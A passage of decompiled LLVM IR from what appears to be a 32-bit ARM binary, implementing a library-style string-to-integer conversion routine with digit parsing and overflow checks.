  %v0_164b8 = phi i32 [ 0, %dec_label_pc_161a0.preheader ], [ %v1_16198, %dec_label_pc_16188 ]
  %v0_161a4 = phi i32 [ %v0_16050, %dec_label_pc_161a0.preheader ], [ %v0_1619c, %dec_label_pc_16188 ]
  %v1_161a4 = add i32 %v0_161a4, -48
  store i32 %v1_161a4, i32* %r0.global-to-local, align 4
  %v2_161a8 = icmp ugt i32 %v1_161a4, 8
  %v7_161a8 = icmp eq i32 %v1_161a4, 9
  %v2_161ac = xor i1 %v2_161a8, true
  %v3_161ac = or i1 %v7_161a8, %v2_161ac
  br i1 %v3_161ac, label %bb191, label %bb193

bb191:                                            ; preds = %dec_label_pc_161a0
  %v7_161ac = icmp ugt i32 %v0_164b8, 429496727
  %v13_161ac = icmp eq i32 %v0_164b8, 429496728
  br label %bb193

bb193:                                            ; preds = %dec_label_pc_161a0, %bb191
  %v1_161b0 = phi i1 [ false, %dec_label_pc_161a0 ], [ %v13_161ac, %bb191 ]
  %v0_161b0 = phi i1 [ %v2_161a8, %dec_label_pc_161a0 ], [ %v7_161ac, %bb191 ]
  %v2_161b0 = xor i1 %v1_161b0, true
  %v3_161b0 = and i1 %v0_161b0, %v2_161b0
  br i1 %v3_161b0, label %dec_label_pc_164b8, label %dec_label_pc_161b4

dec_label_pc_161b4:                               ; preds = %bb193
  %v0_161b4 = load i32, i32* @sl, align 4
  %v1_161b4 = add i32 %v0_161b4, 4
  %v2_161b4 = inttoptr i32 %v1_161b4 to i32*
  %v3_161b4 = load i32, i32* %v2_161b4, align 4
  store i32 %v3_161b4, i32* %r2.global-to-local, align 4
  %v1_161b8 = add i32 %v0_161b4, 104
  %v2_161b8 = inttoptr i32 %v1_161b8 to i32*
  %v3_161b8 = load i32, i32* %v2_161b8, align 4
  %v3_161bc = icmp ult i32 %v3_161b4, %v3_161b8
  br i1 %v3_161bc, label %.thread40.dec_label_pc_16188_crit_edge, label %dec_label_pc_161cc

.thread40.dec_label_pc_16188_crit_edge:           ; preds = %dec_label_pc_161b4
  %v2_161c0 = inttoptr i32 %v3_161b4 to i8*
  %v3_161c0 = load i8, i8* %v2_161c0, align 1
  %v4_161c0 = zext i8 %v3_161c0 to i32
  store i32 %v4_161c0, i32* %r0.global-to-local, align 4
  %v6_161c0 = add i32 %v3_161b4, 1
  store i32 %v6_161c0, i32* %r2.global-to-local, align 4
  store i32 %v6_161c0, i32* %v2_161b4, align 4
  %v0_1619c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16188

dec_label_pc_161cc:                               ; preds = %dec_label_pc_161b4
  store i32 %v0_161b4, i32* %r0.global-to-local, align 4
  %v1_16184 = call i32 @function_1677c(i32 %v0_161b4)
  store i32 %v1_16184, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16188

dec_label_pc_161d0:                               ; preds = %bb184
  %v0_161d0 = load i32, i32* @sl, align 4
  %v1_161d0 = add i32 %v0_161d0, 104
  %v2_161d0 = inttoptr i32 %v1_161d0 to i32*
  %v3_161d0 = load i32, i32* %v2_161d0, align 4
  %v2_161d4 = icmp eq i32 %v3_161d0, 0
  br i1 %v2_161d4, label %.thread43, label %bb194

bb194:                                            ; preds = %dec_label_pc_161d0
  %v2_161d8 = add i32 %v0_161d0, 4
  %v3_161d8 = inttoptr i32 %v2_161d8 to i32*
  %v4_161d8 = load i32, i32* %v3_161d8, align 4
  %v2_161dc = add i32 %v4_161d8, -1
  store i32 %v2_161dc, i32* %v3_161d8, align 4
  %v0_161ec.pre = load i32, i32* @sl, align 4
  %v1_161f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_161d0, %bb194
  %v1_161f0 = phi i32 [ %v0_16030, %dec_label_pc_161d0 ], [ %v1_161f0.pre, %bb194 ]
  %v0_161ec = phi i32 [ %v0_161d0, %dec_label_pc_161d0 ], [ %v0_161ec.pre, %bb194 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v0_161ec, i32* %r0.global-to-local, align 4
  %v7_161f0 = call i32 @function_16718(i32 %v0_161ec, i32 %v1_161f0, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_161f0, i32* %r0.global-to-local, align 4
  %v0_161f4 = call i32 @function_12ecc()
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  %v2_1620c = inttoptr i32 %v0_161f4 to i32*
  store i32 22, i32* %v2_1620c, align 4
  %v2_16214 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_16214, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16218:                               ; preds = %dec_label_pc_166e8, %dec_label_pc_166bc, %dec_label_pc_16688, %dec_label_pc_165c8, %dec_label_pc_163b8, %dec_label_pc_16354, %dec_label_pc_16224, %.thread43
  %v1_16220 = phi i32 [ 0, %dec_label_pc_166e8 ], [ 0, %dec_label_pc_166bc ], [ %v1_16220.pre, %dec_label_pc_16688 ], [ %v2_165f8, %dec_label_pc_165c8 ], [ %v2_163cc, %dec_label_pc_163b8 ], [ %v2_16364, %dec_label_pc_16354 ], [ %v0_16240, %dec_label_pc_16224 ], [ %v2_16214, %.thread43 ]
  store i32 %v6_15f58, i32* @r5, align 4
  store i32 %v12_15f58, i32* @r7, align 4
  store i32 %v15_15f58, i32* @r8, align 4
  store i32 %v18_15f58, i32* @sb, align 4
  store i32 %v21_15f58, i32* @sl, align 4
  store i32 %v24_15f58, i32* @fp, align 4
  ret i32 %v1_16220

dec_label_pc_16224:                               ; preds = %dec_label_pc_15f58
  %v0_16224 = call i32 @function_12ecc()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  %v2_1623c = inttoptr i32 %v0_16224 to i32*
  store i32 22, i32* %v2_1623c, align 4
  %v0_16240 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16240, i32* %r0.global-to-local, align 4
  %v0_16244 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16244, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16258:                               ; preds = %bb198
  %v9_162d0 = icmp eq i32 %v0_162d0, %v6_162bc
  br i1 %v9_162d0, label %dec_label_pc_163e8, label %dec_label_pc_1625c

dec_label_pc_1625c:                               ; preds = %dec_label_pc_163e8, %dec_label_pc_16258
  %v0_1625c = load i32, i32* @sl, align 4
  %v1_1625c = add i32 %v0_1625c, 4
  %v2_1625c = inttoptr i32 %v1_1625c to i32*
  %v3_1625c = load i32, i32* %v2_1625c, align 4
  store i32 %v3_1625c, i32* %r2.global-to-local, align 4
  %v1_16260 = add i32 %v0_1625c, 104
  %v2_16260 = inttoptr i32 %v1_16260 to i32*
  %v3_16260 = load i32, i32* %v2_16260, align 4
  %v3_16264 = icmp ult i32 %v3_1625c, %v3_16260
  br i1 %v3_16264, label %.thread44, label %dec_label_pc_163a8

.thread44:                                        ; preds = %dec_label_pc_1625c
  %v2_16268 = inttoptr i32 %v3_1625c to i8*
  %v3_16268 = load i8, i8* %v2_16268, align 1
  %v4_16268 = zext i8 %v3_16268 to i32
  store i32 %v4_16268, i32* %r0.global-to-local, align 4
  %v6_16268 = add i32 %v3_1625c, 1
  store i32 %v6_16268, i32* %r2.global-to-local, align 4
  store i32 %v6_16268, i32* %v2_1625c, align 4
  br label %dec_label_pc_16274

dec_label_pc_16274:                               ; preds = %.thread44, %dec_label_pc_163a8
  %v0_16274 = load i32, i32* @r7, align 4
  %v1_16274 = load i32, i32* @r5, align 4
  %v6_16274 = shl i32 %v0_16274, %v1_16274
  %v0_16278 = load i32, i32* @r8, align 4
  %v1_16278 = icmp slt i32 %v0_16278, 0
  %v1_1627c = load i32, i32* @r6, align 4
  %v2_1627c = load i32, i32* @sb, align 4
  %v7_1627c = lshr i32 %v1_1627c, %v2_1627c
  %v8_1627c = or i32 %v7_1627c, %v6_16274
  %v6_16280 = shl i32 %v1_1627c, %v1_16274
  br i1 %v1_16278, label %bb196, label %bb195

bb195:                                            ; preds = %dec_label_pc_16274
  %v9_16284 = shl i32 %v1_1627c, %v0_16278
  br label %bb196

bb196:                                            ; preds = %dec_label_pc_16274, %bb195
  %storemerge234 = phi i32 [ %v9_16284, %bb195 ], [ %v8_1627c, %dec_label_pc_16274 ]
  %v1_162a0 = phi i32 [ %v9_16284, %bb195 ], [ %v8_1627c, %dec_label_pc_16274 ]
  store i32 %storemerge234, i32* @r4, align 4
  %v0_1628c = load i32, i32* %r0.global-to-local, align 4
  %v2_1628c = add i32 %v0_1628c, ptrtoint (i32* @global_var_19fe5.646 to i32)
  store i32 %v2_1628c, i32* %r2.global-to-local, align 4
  %v0_16290 = load i32, i32* @fp, align 4
  %v1_16290 = urem i32 %v0_16290, 256
  store i32 %v1_16290, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_16298 = add i32 %v0_1628c, add (i32 ptrtoint (i32* @global_var_19fe5.646 to i32), i32 1)
  %v2_16298 = inttoptr i32 %v1_16298 to i8*
  %v3_16298 = load i8, i8* %v2_16298, align 1
  %v4_16298 = zext i8 %v3_16298 to i32
  store i32 %v4_16298, i32* @fp, align 4
  %v2_1629c = or i32 %v1_16290, %v6_16280
  br label %dec_label_pc_162a4

dec_label_pc_162a4:                               ; preds = %bb186, %bb187, %bb196
  %storemerge = phi i32 [ %v2_1629c, %bb196 ], [ %v0_1624c, %bb186 ], [ %v0_1624c, %bb187 ]
  %v0_162c8 = phi i32 [ %v1_16274, %bb196 ], [ %v0_162ac122, %bb186 ], [ %v0_162ac122, %bb187 ]
  %v0_162dc = phi i32 [ %v4_16298, %bb196 ], [ %v4_160ac, %bb186 ], [ %v4_160ac, %bb187 ]
  %v0_162d0 = phi i32 [ %v1_162a0, %bb196 ], [ 0, %bb186 ], [ 0, %bb187 ]
  store i32 %storemerge, i32* @r6, align 4
  store i32 %v0_162d0, i32* @r7, align 4
  store i32 %v1_16060, i32* %r2.global-to-local, align 4
  %v3_162a8 = icmp ult i32 %v0_162dc, %v1_16060
  %v1_162ac = sub i32 32, %v0_162c8
  store i32 %v1_162ac, i32* @sb, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  br i1 %v3_162a8, label %dec_label_pc_162bc, label %dec_label_pc_16310

dec_label_pc_162bc:                               ; preds = %dec_label_pc_162a4
  %v6_162bc = lshr i32 -1, %v0_162c8
  %v7_162c4 = shl i32 -1, %v1_162ac
  %v8_162c4 = or i32 %v7_162c4, %v6_162bc
  store i32 %v8_162c4, i32* %r2.global-to-local, align 4
  %v1_162c8 = add i32 %v0_162c8, -32
  store i32 %v1_162c8, i32* @r8, align 4
  %v6_162c8 = icmp slt i32 %v1_162c8, 0
  br i1 %v6_162c8, label %bb198, label %bb197

bb197:                                            ; preds = %dec_label_pc_162bc
  %v7_162cc = lshr i32 -1, %v1_162c8
  store i32 %v7_162cc, i32* %r2.global-to-local, align 4
  br label %bb198

bb198:                                            ; preds = %dec_label_pc_162bc, %bb197
  %v1_163e8 = phi i32 [ %v8_162c4, %dec_label_pc_162bc ], [ %v7_162cc, %bb197 ]
  %tmp239 = icmp ugt i32 %v0_162d0, %v6_162bc
  br i1 %tmp239, label %dec_label_pc_162d8, label %dec_label_pc_16258

dec_label_pc_162d8:                               ; preds = %bb198
  store i32 %v1_16060, i32* @r4, align 4
  br label %dec_label_pc_1638c

dec_label_pc_162e4:                               ; preds = %dec_label_pc_16380
  %v0_162e4 = call i32 @function_12ecc()
  store i32 %v0_162e4, i32* %r0.global-to-local, align 4
  %v3_162e8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_162e8, i32* %r1.global-to-local, align 4
  %v1_162ec = urem i32 %v3_162e8, 2
  store i32 34, i32* %r2.global-to-local, align 4
  %v2_162f4 = icmp eq i32 %v1_162ec, 0
  %v2_162f8 = inttoptr i32 %v0_162e4 to i32*
  store i32 34, i32* %v2_162f8, align 4
  br i1 %v2_162f4, label %dec_label_pc_165bc, label %dec_label_pc_16300

dec_label_pc_16300:                               ; preds = %dec_label_pc_162e4
  %v0_16300 = load i32, i32* %r2.global-to-local, align 4
  %v1_16300 = add i32 %v0_16300, -34
  store i32 %v1_16300, i32* %r2.global-to-local, align 4
  %v2_16308 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_16308, i32* @r6, align 4
  store i32 %arg5, i32* @r7, align 4
  br label %dec_label_pc_16310

dec_label_pc_16310:                               ; preds = %dec_label_pc_162a4, %dec_label_pc_16400, %dec_label_pc_163f4, %dec_label_pc_164f8, %dec_label_pc_164f0, %dec_label_pc_165bc, %dec_label_pc_16300
  %v1_16328232 = phi i32 [ %arg5, %dec_label_pc_165bc ], [ %arg5, %dec_label_pc_16300 ], [ %v0_1652c, %dec_label_pc_164f0 ], [ 0, %dec_label_pc_163f4 ], [ %v0_1652c, %dec_label_pc_164f8 ], [ %v0_162d0, %dec_label_pc_162a4 ], [ %v5_16410, %dec_label_pc_16400 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_165bc ], [ %v1_16300, %dec_label_pc_16300 ], [ %stack_var_-44.1, %dec_label_pc_164f0 ], [ %stack_var_-44.1, %dec_label_pc_163f4 ], [ %stack_var_-44.1, %dec_label_pc_164f8 ], [ %stack_var_-44.1, %dec_label_pc_162a4 ], [ %stack_var_-44.1, %dec_label_pc_16400 ]
  %v0_16310 = load i32, i32* @sl, align 4
  %v1_16310 = add i32 %v0_16310, 104
  %v2_16310 = inttoptr i32 %v1_16310 to i32*
  %v3_16310 = load i32, i32* %v2_16310, align 4
  %v2_16314 = icmp eq i32 %v3_16310, 0
  br i1 %v2_16314, label %.thread47, label %bb199

bb199:                                            ; preds = %dec_label_pc_16310
  %v2_16318 = add i32 %v0_16310, 4
  %v3_16318 = inttoptr i32 %v2_16318 to i32*
  %v4_16318 = load i32, i32* %v3_16318, align 4
  %v2_1631c = add i32 %v4_16318, -1
  store i32 %v2_1631c, i32* %v3_16318, align 4
  %v1_16328.pre = load i32, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_16310, %bb199
  %v1_16328 = phi i32 [ %v1_16328232, %dec_label_pc_16310 ], [ %v1_16328.pre, %bb199 ]
  %v3_16328 = icmp ule i32 %v1_16328, %arg5
  %v9_16328 = icmp eq i32 %v1_16328, %arg5
  %v2_1632c = xor i1 %v9_16328, true
  %v3_1632c = and i1 %v3_16328, %v2_1632c
  br i1 %v3_1632c, label %dec_label_pc_163b8, label %dec_label_pc_16330

dec_label_pc_16330:                               ; preds = %.thread47
  %v3_16600 = load i32, i32* %stack_var_0, align 4
  br i1 %v9_16328, label %dec_label_pc_16600, label %dec_label_pc_16334

dec_label_pc_16334:                               ; preds = %dec_label_pc_16330, %dec_label_pc_16600
  store i32 %v3_16600, i32* %r1.global-to-local, align 4
  %v1_1633c = urem i32 %v3_16600, 2
  %v2_16340 = or i32 %v1_1633c, %stack_var_-44.2
  store i32 %v2_16340, i32* %r2.global-to-local, align 4
  %v4_16340 = icmp eq i32 %v2_16340, 0
  br i1 %v4_16340, label %dec_label_pc_165c8, label %dec_label_pc_16348

dec_label_pc_16348:                               ; preds = %dec_label_pc_16334
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %tmp240 = icmp ugt i32 %v1_16328, %arg5
  br i1 %tmp240, label %dec_label_pc_16354, label %dec_label_pc_163b4

dec_label_pc_16354:                               ; preds = %dec_label_pc_16610, %dec_label_pc_16348
  %v0_16354 = call i32 @function_12ecc()
  %v2_1635c = inttoptr i32 %v0_16354 to i32*
  store i32 34, i32* %v2_1635c, align 4
  %v2_16364 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_16364, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16374:                               ; preds = %.thread48.dec_label_pc_16374_crit_edge, %dec_label_pc_163a4
  %v0_16378 = phi i32 [ %v0_16378.pre, %.thread48.dec_label_pc_16374_crit_edge ], [ %v1_16370, %dec_label_pc_163a4 ]
  %v1_1637c = add i32 %v0_16378, add (i32 ptrtoint (i32* @global_var_19fe5.646 to i32), i32 1)
  %v2_1637c = inttoptr i32 %v1_1637c to i8*
  %v3_1637c = load i8, i8* %v2_1637c, align 1
  %v4_1637c = zext i8 %v3_1637c to i32
  br label %dec_label_pc_16380

dec_label_pc_16380:                               ; preds = %dec_label_pc_1649c, %dec_label_pc_16490.dec_label_pc_16380.loopexit207_crit_edge, %dec_label_pc_163e8, %.thread145, %dec_label_pc_16374
  %v0_16384 = phi i32 [ %v4_1637c, %dec_label_pc_16374 ], [ %v6_164fc, %.thread145 ], [ %v0_162dc, %dec_label_pc_163e8 ], [ %v0_16384.pre.pre, %dec_label_pc_16490.dec_label_pc_16380.loopexit207_crit_edge ], [ %v0_16450, %dec_label_pc_1649c ]
  %stack_var_-60.2.off0 = phi i32 [ %stack_var_-60.3.off0, %dec_label_pc_16374 ], [ 10, %.thread145 ], [ %v1_16060, %dec_label_pc_163e8 ], [ %v1_16060, %dec_label_pc_16490.dec_label_pc_16380.loopexit207_crit_edge ], [ %v1_16060, %dec_label_pc_1649c ]
  store i32 %stack_var_-60.2.off0, i32* @r4, align 4
  %v3_16384 = icmp ult i32 %v0_16384, %stack_var_-60.2.off0
  br i1 %v3_16384, label %dec_label_pc_1638c, label %dec_label_pc_162e4

dec_label_pc_1638c:                               ; preds = %dec_label_pc_16380, %dec_label_pc_162d8
  %stack_var_-60.3.off0 = phi i32 [ %stack_var_-60.2.off0, %dec_label_pc_16380 ], [ %v1_16060, %dec_label_pc_162d8 ]
  %v0_1638c = load i32, i32* @sl, align 4
  %v1_1638c = add i32 %v0_1638c, 4
  %v2_1638c = inttoptr i32 %v1_1638c to i32*
  %v3_1638c = load i32, i32* %v2_1638c, align 4
  store i32 %v3_1638c, i32* %r2.global-to-local, align 4
  %v1_16390 = add i32 %v0_1638c, 104
  %v2_16390 = inttoptr i32 %v1_16390 to i32*
  %v3_16390 = load i32, i32* %v2_16390, align 4
  %v3_16394 = icmp ult i32 %v3_1638c, %v3_16390
  br i1 %v3_16394, label %.thread48.dec_label_pc_16374_crit_edge, label %dec_label_pc_163a4

.thread48.dec_label_pc_16374_crit_edge:           ; preds = %dec_label_pc_1638c
  %v2_16398 = inttoptr i32 %v3_1638c to i8*
  %v3_16398 = load i8, i8* %v2_16398, align 1
  %v4_16398 = zext i8 %v3_16398 to i32
  store i32 %v4_16398, i32* %r0.global-to-local, align 4
  %v6_16398 = add i32 %v3_1638c, 1
  store i32 %v6_16398, i32* %r2.global-to-local, align 4
  store i32 %v6_16398, i32* %v2_1638c, align 4
  %v0_16378.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16374

dec_label_pc_163a4:                               ; preds = %dec_label_pc_1638c
  store i32 %v0_1638c, i32* %r0.global-to-local, align 4
  %v1_16370 = call i32 @function_1677c(i32 %v0_1638c)
  store i32 %v1_16370, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16374

dec_label_pc_163a8:                               ; preds = %dec_label_pc_1625c
  store i32 %v0_1625c, i32* %r0.global-to-local, align 4
  %v1_163ac = call i32 @function_1677c(i32 %v0_1625c)
  store i32 %v1_163ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16274

dec_label_pc_163b4:                               ; preds = %dec_label_pc_16348
  br i1 %v9_16328, label %dec_label_pc_16610, label %dec_label_pc_163b8

dec_label_pc_163b8:                               ; preds = %dec_label_pc_16610, %dec_label_pc_16600, %dec_label_pc_163b4, %.thread47
  %v3_163c0 = ashr i32 %stack_var_-44.2, 31
  %v1_163c4 = load i32, i32* @r6, align 4
  %v2_163c4 = xor i32 %v1_163c4, %stack_var_-44.2
  %v2_163c8 = xor i32 %v1_16328, %v3_163c0
  %v2_163cc = sub i32 %v2_163c4, %stack_var_-44.2
  %v3_163cc = icmp uge i32 %v2_163c4, %stack_var_-44.2
  %v3_163d0 = icmp eq i1 %v3_163cc, false
  %v4_163d0 = sub i32 %v2_163c8, %v3_163c0
  %v6_163d0 = sext i1 %v3_163d0 to i32
  %v7_163d0 = add i32 %v6_163d0, %v4_163d0
  store i32 %v7_163d0, i32* %r2.global-to-local, align 4
  store i32 %v2_163cc, i32* %stack_var_0, align 4
  store i32 %v2_163cc, i32* %r0.global-to-local, align 4
  store i32 %v7_163d0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_163e8:                               ; preds = %dec_label_pc_16258
  %tmp241 = icmp ugt i32 %storemerge, %v1_163e8
  br i1 %tmp241, label %dec_label_pc_16380, label %dec_label_pc_1625c

dec_label_pc_163f4:                               ; preds = %bb189, %.dec_label_pc_163f4_crit_edge
  store i32 %v0_163f4, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v3_1641862 = icmp ult i32 %v0_1641860, %v1_16060
  br i1 %v3_1641862, label %dec_label_pc_16444, label %dec_label_pc_16310

dec_label_pc_16400:                               ; preds = %.thread50.dec_label_pc_16400_crit_edge, %dec_label_pc_16484
  %v0_16404 = phi i32 [ %v0_16404.pre, %.thread50.dec_label_pc_16400_crit_edge ], [ %v1_16488, %dec_label_pc_16484 ]
  %v0_16408 = load i32, i32* @r4, align 4
  %v1_16408 = load i32, i32* @r8, align 4
  %v2_16408 = add i32 %v1_16408, %v0_16408
  store i32 %v2_16408, i32* @r6, align 4
  %v3_16408 = icmp ult i32 %v2_16408, %v0_16408
  %v1_1640c = add i32 %v0_16404, add (i32 ptrtoint (i32* @global_var_19fe5.646 to i32), i32 1)
  %v2_1640c = inttoptr i32 %v1_1640c to i8*
  %v3_1640c = load i8, i8* %v2_1640c, align 1
  %v4_1640c = zext i8 %v3_1640c to i32
  store i32 %v4_1640c, i32* @fp, align 4
  %v0_16410 = load i32, i32* @r5, align 4
  %v1_16410 = load i32, i32* @sb, align 4
  %v4_16410 = zext i1 %v3_16408 to i32
  %v3_16410 = add i32 %v0_16410, %v4_16410
  %v5_16410 = add i32 %v3_16410, %v1_16410
  store i32 %v5_16410, i32* @r7, align 4
  %v3_16418 = icmp ult i32 %v4_1640c, %v1_16060
  br i1 %v3_16418, label %dec_label_pc_16444, label %dec_label_pc_16310

dec_label_pc_16444:                               ; preds = %dec_label_pc_16400, %dec_label_pc_163f4
  store i32 %v1_16060, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r0, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %v1_16060, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v5_16438 = call i32 @function_1764c(i32 -1, i32 -1, i32 %v1_16060, i32 0)
  store i32 %v5_16438, i32* %r0.global-to-local, align 4
  %v0_1643c = load i32, i32* @r7, align 4
  %v3_1643c = icmp eq i32 %v0_1643c, -1
  %v0_16490 = load i32, i32* @r6, align 4
  br i1 %v3_1643c, label %dec_label_pc_16490, label %dec_label_pc_16468

dec_label_pc_16468:                               ; preds = %dec_label_pc_16444, %dec_label_pc_16490
  %v1_16448 = zext i32 %v0_16490 to i64
  %v2_16448 = load i32, i32* @r4, align 4
  %v3_16448 = zext i32 %v2_16448 to i64
  %v4_16448 = mul nuw i64 %v3_16448, %v1_16448
  %v5_16448 = udiv i64 %v4_16448, 4294967296
  %v6_16448 = trunc i64 %v5_16448 to i32
  %v7_16448 = trunc i64 %v4_16448 to i32
  store i32 %v7_16448, i32* @r8, align 4
  %v3_1644c = mul i32 %v2_16448, %v0_1643c
  %v4_1644c = add i32 %v6_16448, %v3_1644c
  store i32 %v4_1644c, i32* @sb, align 4
  %v0_16450 = load i32, i32* @fp, align 4
  %v1_16450 = urem i32 %v0_16450, 256
  store i32 %v1_16450, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v3_1645c = icmp eq i32 %v4_1644c, -1
  %v0_16450.not = or i32 %v0_16450, -256
  %v1_16460 = xor i32 %v0_16450.not, 255
  store i32 %v1_16460, i32* %r2.global-to-local, align 4
  br i1 %v3_1645c, label %dec_label_pc_1649c, label %dec_label_pc_1646c

dec_label_pc_1646c:                               ; preds = %dec_label_pc_1649c, %dec_label_pc_16468
  %v0_1646c = load i32, i32* @sl, align 4
  %v1_1646c = add i32 %v0_1646c, 4
  %v2_1646c = inttoptr i32 %v1_1646c to i32*
  %v3_1646c = load i32, i32* %v2_1646c, align 4
  store i32 %v3_1646c, i32* %r2.global-to-local, align 4
  %v1_16470 = add i32 %v0_1646c, 104
  %v2_16470 = inttoptr i32 %v1_16470 to i32*
  %v3_16470 = load i32, i32* %v2_16470, align 4
  %v3_16474 = icmp ult i32 %v3_1646c, %v3_16470
  br i1 %v3_16474, label %.thread50.dec_label_pc_16400_crit_edge, label %dec_label_pc_16484

.thread50.dec_label_pc_16400_crit_edge:           ; preds = %dec_label_pc_1646c
  %v2_16478 = inttoptr i32 %v3_1646c to i8*
  %v3_16478 = load i8, i8* %v2_16478, align 1
  %v4_16478 = zext i8 %v3_16478 to i32
  store i32 %v4_16478, i32* %r0.global-to-local, align 4
  %v6_16478 = add i32 %v3_1646c, 1
  store i32 %v6_16478, i32* %r2.global-to-local, align 4
  store i32 %v6_16478, i32* %v2_1646c, align 4
  %v0_16404.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16400

dec_label_pc_16484:                               ; preds = %dec_label_pc_1646c
  store i32 %v0_1646c, i32* %r0.global-to-local, align 4
  %v1_16488 = call i32 @function_1677c(i32 %v0_1646c)
  store i32 %v1_16488, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16400

dec_label_pc_16490:                               ; preds = %dec_label_pc_16444
  %tmp242 = icmp ugt i32 %v0_16490, %v5_16438
  br i1 %tmp242, label %dec_label_pc_16490.dec_label_pc_16380.loopexit207_crit_edge, label %dec_label_pc_16468

dec_label_pc_16490.dec_label_pc_16380.loopexit207_crit_edge: ; preds = %dec_label_pc_16490
  %v0_16384.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_16380

dec_label_pc_1649c:                               ; preds = %dec_label_pc_16468
  %tmp243 = icmp ugt i32 %v7_16448, %v1_16460
  br i1 %tmp243, label %dec_label_pc_16380, label %dec_label_pc_1646c

dec_label_pc_164a8:                               ; preds = %dec_label_pc_15fd8
  store i32 %v0_15fd8, i32* %r0.global-to-local, align 4
  %v1_164ac = call i32 @function_1677c(i32 %v0_15fd8)
  store i32 %v1_164ac, i32* %r0.global-to-local, align 4
  store i32 %v1_164ac, i32* @r5, align 4
  br label %dec_label_pc_15ff0

dec_label_pc_164b8:                               ; preds = %bb193
  store i32 %v0_164b8, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_164c0

dec_label_pc_164c0:                               ; preds = %dec_label_pc_16588, %dec_label_pc_164b8
  %v0_164fc = phi i32 [ %v0_16598, %dec_label_pc_16588 ], [ %v0_161a4, %dec_label_pc_164b8 ]
  %v0_16528 = phi i32 [ %v2_16590, %dec_label_pc_16588 ], [ %v0_164b8, %dec_label_pc_164b8 ]
  %v0_1652c = phi i32 [ %v5_16594, %dec_label_pc_16588 ], [ 0, %dec_label_pc_164b8 ]
  %v0_164f0 = phi i32 [ %v1_16598, %dec_label_pc_16588 ], [ %v1_161a4, %dec_label_pc_164b8 ]
  %v2_164c4 = icmp ugt i32 %v0_164f0, 8
  %v7_164c4 = icmp eq i32 %v0_164f0, 9
  %v2_164c8 = xor i1 %v7_164c4, true
  %v3_164c8 = and i1 %v2_164c4, %v2_164c8
  br i1 %v3_164c8, label %bb200, label %bb201

bb200:                                            ; preds = %dec_label_pc_164c0
  store i32 0, i32* @r2, align 4
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_164c0, %bb200
  %v2_164cc = xor i1 %v2_164c4, true
  %v3_164cc = or i1 %v7_164c4, %v2_164cc
  br i1 %v3_164cc, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  store i32 1, i32* @r2, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v3_164d0 = icmp ugt i32 %v0_1652c, 429496728
  %v9_164d0 = icmp eq i32 %v0_1652c, 429496729
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_164d8 = xor i1 %v9_164d0, true
  %v3_164d8 = and i1 %v3_164d0, %v2_164d8
  br i1 %v3_164d8, label %dec_label_pc_164e4, label %dec_label_pc_164dc

dec_label_pc_164dc:                               ; preds = %bb203
  br i1 %v9_164d0, label %dec_label_pc_16510, label %dec_label_pc_164e0

dec_label_pc_164e0:                               ; preds = %dec_label_pc_16510, %dec_label_pc_164dc
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_164e4

dec_label_pc_164e4:                               ; preds = %dec_label_pc_16510, %bb203, %dec_label_pc_164e0
  %v1_164e4 = phi i32 [ 0, %dec_label_pc_16510 ], [ 0, %bb203 ], [ 1, %dec_label_pc_164e0 ]
  %v0_164e4 = load i32, i32* @r2, align 4
  %v2_164e4 = and i32 %v0_164e4, %v1_164e4
  %v2_164e8 = icmp eq i32 %v2_164e4, 0
  br i1 %v2_164e8, label %dec_label_pc_164f0, label %dec_label_pc_16528

dec_label_pc_164f0:                               ; preds = %dec_label_pc_165b0, %dec_label_pc_164e4, %dec_label_pc_16528
  br i1 %v3_164c8, label %dec_label_pc_16310, label %dec_label_pc_164f8

dec_label_pc_164f8:                               ; preds = %dec_label_pc_164f0
  store i32 ptrtoint (i32* @global_var_19fe6.644 to i32), i32* %r0.global-to-local, align 4
